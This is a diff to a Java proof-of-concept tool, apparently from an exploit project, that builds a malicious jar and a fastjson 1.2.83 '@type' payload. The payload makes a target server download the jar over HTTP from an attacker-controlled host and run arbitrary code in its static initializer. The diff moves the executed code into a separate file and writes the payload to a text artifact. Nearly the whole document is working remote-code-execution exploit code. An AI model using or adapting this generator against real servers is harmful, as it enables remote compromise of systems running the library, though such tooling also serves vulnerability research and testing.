@@ -1,9 +1,11 @@
-package PoC_1283;
+package poc_1283;
 
 import picocli.CommandLine;
-import picocli.CommandLine.ArgGroup;
 import picocli.CommandLine.Command;
 import picocli.CommandLine.Option;
+import utils.CodeLoader;
+import utils.JavassistGen;
+import utils.PocIO;
 
 import java.util.concurrent.Callable;
 
@@ -16,13 +18,13 @@ import java.util.concurrent.Callable;
  *   → LaunchedURLClassLoader 下载该 jar → 读 POC.class → ASM 检测 @JSONType → jsonType=true
  *   → loadClass → <clinit> 执行
  *
+ * 要执行的代码从 code_to_run.txt 读取（含 try-catch 包裹）。
+ *
  * 使用：
- *   java -cp ... PoC_1283.GenHttpProbe [--host H] [--port P] [--jar J] \
- *       (--cmd C | --code JAVA | --code-file F)
- * 缺省 payload = --cmd "touch /tmp/success"；详见 --help。
+ *   java -cp ... poc_1283.GenHttpProbe [--host H] [--port P] [--jar J]
  */
 @Command(name = "GenHttpProbe", mixinStandardHelpOptions = true,
-        description = "生成 fastjson 1.2.83 一阶段 jar:http 远程加载的恶意 jar")
+        description = "生成 fastjson 1.2.83 一阶段 jar:http 远程加载的恶意 jar（代码来自 code_to_run.txt）")
 public class GenHttpProbe implements Callable<Integer> {
 
     @Option(names = "--host", defaultValue = "127.0.0.1",
@@ -32,25 +34,27 @@ public class GenHttpProbe implements Callable<Integer> {
     @Option(names = "--port", defaultValue = "11111", description = "攻击机 HTTP 端口")
     String port;
 
-    @Option(names = "--jar", defaultValue = "probe", description = "输出 jar 名（不含扩展名）")
+    @Option(names = "--jar", defaultValue = "probe", description = "jar 名（不含扩展名，默认 probe）")
     String jarName;
-
-    @ArgGroup(exclusive = true, heading = "payload（三选一，缺省 = --cmd \"touch /tmp/success\"）%n")
-    Modes modes;
 
     @Override
     public Integer call() throws Exception {
         long ipInt = ipToInt(host);
         // 类的 internal name（/ 分隔），加载时与 @type 替换后匹配
         String internalName = "jar:http://" + ipInt + ":" + port + "/" + jarName + "!/POC";
+        String payload = "{\"@type\":\"jar:http:.." + ipInt + ":" + port + "." + jarName + "!.POC\",\"x\":1}";
 
-        byte[] classBytes = JavassistGen.generate(internalName, Modes.bodyOrDefault(modes, "touch /tmp/success"));
-        PocIO.writeJar("www/" + jarName, "POC.class", classBytes);
+        // fastjson 1.x 需要 @JSONType 注解作为信任信号 → withJsonType=true
+        byte[] classBytes = JavassistGen.generate(internalName, CodeLoader.loadBody(), true);
 
-        System.out.println("[+] jar written  : www/" + jarName);
+        // 产物统一放 poc/artifacts/1283/（从项目根目录运行）
+        PocIO.writeJar("poc/artifacts/1283/" + jarName, "POC.class", classBytes);
+        PocIO.writeText("poc/artifacts/1283/http-payload.txt", payload + System.lineSeparator());
+
+        System.out.println("[+] jar written  : poc/artifacts/1283/" + jarName);
+        System.out.println("[+] payload file : poc/artifacts/1283/http-payload.txt");
         System.out.println("[+] internalName : " + internalName);
-        System.out.println("[+] body(mode)   : " + (modes == null ? "cmd" : modes.mode()));
-        System.out.println("[+] payload      : {\"@type\":\"jar:http:.." + ipInt + ":" + port + "." + jarName + "!.POC\",\"x\":1}");
+        System.out.println("[+] payload      : " + payload);
         return 0;
     }
 
